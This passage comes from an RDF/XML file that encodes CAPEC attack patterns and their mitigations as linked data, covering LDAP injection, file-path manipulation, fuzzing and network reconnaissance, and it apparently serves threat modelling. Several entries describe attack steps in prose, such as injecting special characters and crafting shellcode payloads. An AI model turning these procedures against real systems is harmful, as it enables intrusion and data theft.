  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Associate some ACL (in the form of a token) with an authenticated user which they provide middleware. The middleware uses this token as part of its channel/message selection for that client  or part of a discerning authorization decision for privileged channels/messages. The purpose is to architect the system in a way that associates proper authentication/authorization with each channel/message.::Re-architect system input/output channels as appropriate to distribute self-protecting data. That is  encrypt (or otherwise protect) channels/messages so that only authorized readers can see them.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack493"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack81">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#478">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:203::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Usable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Modification of Windows Service Configuration"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Execute Unauthorized Commands By altering specific configuration settings for the service  the adversary could run arbitrary code to be executed.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker298">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#136">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:248::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#LDAP Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack298">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#136"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::77::90::20::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey application) The attacker takes an inventory of the entry points of the application.TECHNIQUE:Spider web sites for all available links:TECHNIQUE:Sniff network communications with application using a utility such as WireShark.::STEP:2:PHASE:Experiment:DESCRIPTION:(Determine user-controllable input susceptible to LDAP injection) For each user-controllable input that the attacker suspects is vulnerable to LDAP injection  attempt to inject characters that have special meaning in LDAP (such as a single quote character  etc.). The goal is to create a LDAP query with an invalid syntaxTECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters:TECHNIQUE:Use a web application debugging tool such as Tamper Data  TamperIE  WebScarab etc. to modify HTTP POST parameters  hidden fields  non-freeform fields  or other HTTP header.:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:3:PHASE:Experiment:DESCRIPTION:(Try to exploit the LDAP injection vulnerability) After determining that a given input is vulnerable to LDAP Injection  hypothesize what the underlying query looks like. Possibly using a tool  iteratively try to add logic to the query to extract information from the LDAP  or to modify or delete information in the LDAP.TECHNIQUE:Add logic to the LDAP query to change the meaning of that command. Automated tools could be used to generate the LDAP injection strings.:TECHNIQUE:Use a web application debugging tool such as Tamper Data  TamperIE  WebScarab etc. to modify HTTP POST parameters  hidden fields  non-freeform fields  or other HTTP header.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::77::90::20::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must accept a string as user input  fail to sanitize characters that have a special meaning in LDAP queries in the user input  and insert the user-supplied string in an LDAP query which is then processed.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker needs to have knowledge of LDAP  especially its query syntax.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker165">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#332"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack165"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3  Port Unreachable..::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker52">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#188">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Reverse Engineering"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack52">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#188"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to targeted system  resources  and information.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Understanding of low level programming languages or technologies can be very helpful. For example  when reverse engineering a binary file  an understanding of assembly languages can help to determine the purpose and inner-workings of the code. Another example is reverse engineering an application that relies on networking. Here  an understanding networking protocols can provide insight into application details.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The technical resources necessary to engage in reverse engineering differ in accordance with the type of object  resource  or system being analyzed.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure rigorous physical defensive measures to keep the adversary from accessing critical systems..::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack392">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#583">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:582::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Disabling Network Hardware"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Availability Other Denial of Service::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker297">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#76">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:126::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Manipulating Web Input to File System Calls"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack297">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#76"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::23::22::73::77::346::348::285::264::272::59::74::15::715::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Fingerprinting of the operating system) In order to create a valid file injection  the attacker needs to know what the underlying OS is.TECHNIQUE:Port mapping. Identify ports that the system is listening on  and attempt to identify inputs and protocol types on those ports.:TECHNIQUE:TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses  he attempts to guess the actual operating system.:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:(Survey the Application to Identify User-controllable Inputs) The attacker surveys the target application to identify all user-controllable inputs  possibly as a valid and authenticated userTECHNIQUE:Spider web sites for all available links  entry points to the web site.:TECHNIQUE:Manually explore application and inventory all application inputs::STEP:3:PHASE:Experiment:DESCRIPTION:(Vary inputs  looking for malicious results) Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the applicationTECHNIQUE:Inject context-appropriate malicious file path using network packet injection tools (netcat  nemesis  etc.):TECHNIQUE:Inject context-appropriate malicious file path using web test frameworks (proxies  TamperData  custom programs  etc.) or simple HTTP requests:TECHNIQUE:Inject context-appropriate malicious file system control syntax::STEP:4:PHASE:Exploit:DESCRIPTION:(Manipulate files accessible by the application) The attacker may steal information or directly manipulate files (delete  copy  flush  etc.)TECHNIQUE:The attacker injects context-appropriate malicious file path to access the content of the targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file system control syntax to access the content of the targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file path to cause the application to create  delete a targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file system control syntax to cause the application to create  delete a targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file path in order to manipulate the meta-data of the targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file system control syntax in order to manipulate the meta-data of the targeted file.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::23::22::73::77::346::348::285::264::272::59::74::15::715::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Program must allow for user controlled variables to be applied directly to the filesystem::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To identify file system entry point and execute against an over-privileged system interface:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker164">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#297">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:292::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#TCP ACK Ping"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack164">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#297"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to send an ACK packet to a remote host and identify the response. Creating the ACK packet without building a full connection requires the use of raw sockets. As a result  it is not possible to send a TCP ACK ping from some systems (Windows XP SP 2) without the use of third-party packet drivers like Winpcap. On other systems (BSD  Linux) administrative privileges are required in order to write to the raw socket.::The target must employ a stateless firewall that lacks a rule set that rejects unsolicited ACK packets.::The adversary requires the ability to craft custom TCP ACK segments for use during network reconnaissance. Sending an ACK ping requires the ability to access raw sockets in order to create the packets with direct access to the packet header.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::ACK scanning can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker51">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#643">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:309::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Identify Shared Files/Directories on System"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack51">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#643"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::267::200::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data The adversary is potentially able to identify the location of sensitive information or lateral pathways through the network.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::267::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have obtained logical access to the system by some means (e.g.  via obtained credentials or planting malware on the system).::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Once the adversary has logical access (which can potentially require high knowledge and skill level)  the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line. The adversary  or his malware  can simply employ a set of commands that search for shared drives on the system (e.g.  net view remote system or net share).:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker162">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#598">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:194::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#DNS Spoofing"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack162">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#598"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::On/In Path Device::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:To distribute email:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Prevent unknown code from executing on a system through whitelisting policy.::Patch installed applications as soon as new updates become available.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack422">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#634">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:651::NATURE:ChildOf:CAPEC ID:545::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Probe Audio and Video Peripherals"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::267::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use browser technologies that do not allow client side scripting.::Utilize strict type  character  and encoding enforcement.::Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side  the client&apos;s browser has no way of discerning where the data is originating from.::Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all remote content.::Perform output validation for all remote content.::Disable scripting languages such as JavaScript in browser::Session tokens for specific host::Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser  web servers  and plug in technologies  staying current on patch release that deal with XSS countermeasures mitigates this.::Privileges are constrained  if a script is loaded  ensure system runs in chroot jail or other limited authority mode::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack212"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker54">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#32"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack54"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::80::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target client software must allow scripting such as JavaScript. Server software must allow display of remote generated HTML without sufficient input or output validation.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To place malicious payload on server via HTTP:LEVEL:Low::SKILL:Exploiting any information gathered by HTTP Query on script host:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to send HTTP post to scripting host and collect output::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Mitigating this attack requires countermeasures employed on both the retransmission device as well as on the cell tower. Therefore  any system that relies on existing commercial cell towards will likely be vulnerable to this attack. By using a private cellular LTE network (i.e.  a custom cell tower)  jamming countermeasures could be developed and employed.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack399">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#605">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:601::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Cellular Jamming"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption The attacker&apos;s goal is to prevent users from accessing the cellular network. Denying connectivity to the cellular network prevents the user from being able to transmit or receive any data  which also prevents VOIP calls  however this attack poses no threat to data confidentiality.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker296">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#176"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack296"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::15::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must consult external files or configuration controls to control its execution. All but the very simplest applications meet this requirement.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must have the access necessary to affect the files or other environment items the targeted application uses for its operations.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker163">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#292"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack163"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary requires logical access to the target network in order to carry out host discovery.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The resources required will differ based upon the type of host discovery being performed. Usually a network scanning tool or scanning script is required due to the volume of requests that must be generated.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them::All user controllable input must be appropriately sanitized before use in the application. This includes omitting  or encoding  certain characters or strings that have the potential of being interpreted as part of an SSI directive::Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack230"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Test to ensure that the software behaves as per specification and that there are no unintended side effects. Ensure that no assumptions about the validity of data are made.::Use fuzz testing during the software QA process to uncover any surprises  uncover any assumptions or unexpected behavior.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack394">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#28">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Fuzzing"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::74::388::20::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Observe communication and inputs) The fuzzing attacker observes the target system looking for inputs and communications between modules  subsystems  or systems.TECHNIQUE:Network sniffing. Using a network sniffer such as wireshark  the attacker observes communications into and out of the target system.:TECHNIQUE:Monitor API execution. Using a tool such as ktrace  strace  APISpy  or another debugging tool  the attacker observes the system calls and API calls that are made by the target system  and the nature of their parameters.:TECHNIQUE:Observe inputs using web inspection tools (OWASP&apos;s WebScarab  Paros  TamperData  TamperIE  etc.)::STEP:2:PHASE:Experiment:DESCRIPTION:(Generate fuzzed inputs) Given a fuzzing tool  a target input or protocol  and limits on time  complexity  and input variety  generate a list of inputs to try. Although fuzzing is random  it is not exhaustive. Parameters like length  composition  and how many variations to try are important to get the most cost-effective impact from the fuzzer.TECHNIQUE:Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields  inputs  or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations  approach each bit of an individual field with on and off (e.g.  0x80).:TECHNIQUE:Attempt arguments to system calls or APIs. The variations include payloads that  if they were successful  could lead to a compromise on the system.::STEP:3:PHASE:Experiment:DESCRIPTION:(Observe the outcome) Observe the outputs to the inputs fed into the system by fuzzers and see if anything interesting happens. If failure occurs  determine why that happened. Figure out the underlying assumption that was invalidated by the input.::STEP:4:PHASE:Exploit:DESCRIPTION:(Craft exploit payloads) Put specially crafted input into the system that leverages the weakness identified through fuzzing and allows to achieve the goals of the attacker. Fuzzers often reveal ways to slip through the input validation filters and introduce unwanted data into the system.TECHNIQUE:Identify and embed shell code for the target system.:TECHNIQUE:Embed higher level attack commands in the payload. (e.g.  SQL  PHP  server-side includes  etc.):TECHNIQUE:Induce denial of service by exploiting resource leaks or bad error handling.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Alter Execution Logic::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Authenticate all servers and perform redundant checks when using DNS hostnames.::Purchase potential TypoSquatted domains and forward to legitimate domain.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack159"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker294">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#388"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack294"/>
